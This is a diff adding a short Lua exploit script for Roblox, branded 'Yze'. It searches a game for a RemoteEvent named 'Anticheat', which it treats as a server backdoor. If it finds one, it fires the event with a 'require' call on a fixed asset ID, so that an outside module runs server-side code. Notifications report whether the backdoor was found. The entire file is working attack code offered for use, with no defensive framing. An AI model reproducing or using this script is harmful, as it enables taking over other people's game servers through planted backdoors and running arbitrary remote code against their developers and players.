@@ -1,0 +1,44 @@
+--[[
+██╗   ██╗███████╗███████╗
+╚██╗ ██╔╝╚══███╔╝██╔════╝
+ ╚████╔╝   ███╔╝ █████╗  
+  ╚██╔╝   ███╔╝  ██╔══╝  
+   ██║   ███████╗███████╗
+   ╚═╝   ╚══════╝╚══════╝
+   ]]
+                         
+                         
+                         
+                         
+                         
+
+game:GetService("StarterGui"):SetCore(
+	"SendNotification",{
+		Title = "Yze - Loading...",
+		Duration = 3,
+		Text = "Checking for backdoor..."
+	}
+)
+
+local moduleID = 128783909791585
+local backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Anticheat")
+
+if backdoor then
+    local executeScript = string.format('require(%d)()', moduleID)
+    backdoor:FireServer(executeScript)
+    game:GetService("StarterGui"):SetCore(
+	"SendNotification",{
+		Title = "Yze - Found!",
+		Duration = 3,
+		Text = "Backdoor founded."
+	}
+)
+else
+    game:GetService("StarterGui"):SetCore(
+	"SendNotification",{
+		Title = "Yze - Failed.",
+		Duration = 3,
+		Text = "Backdoor not founded."
+	}
+)
+end
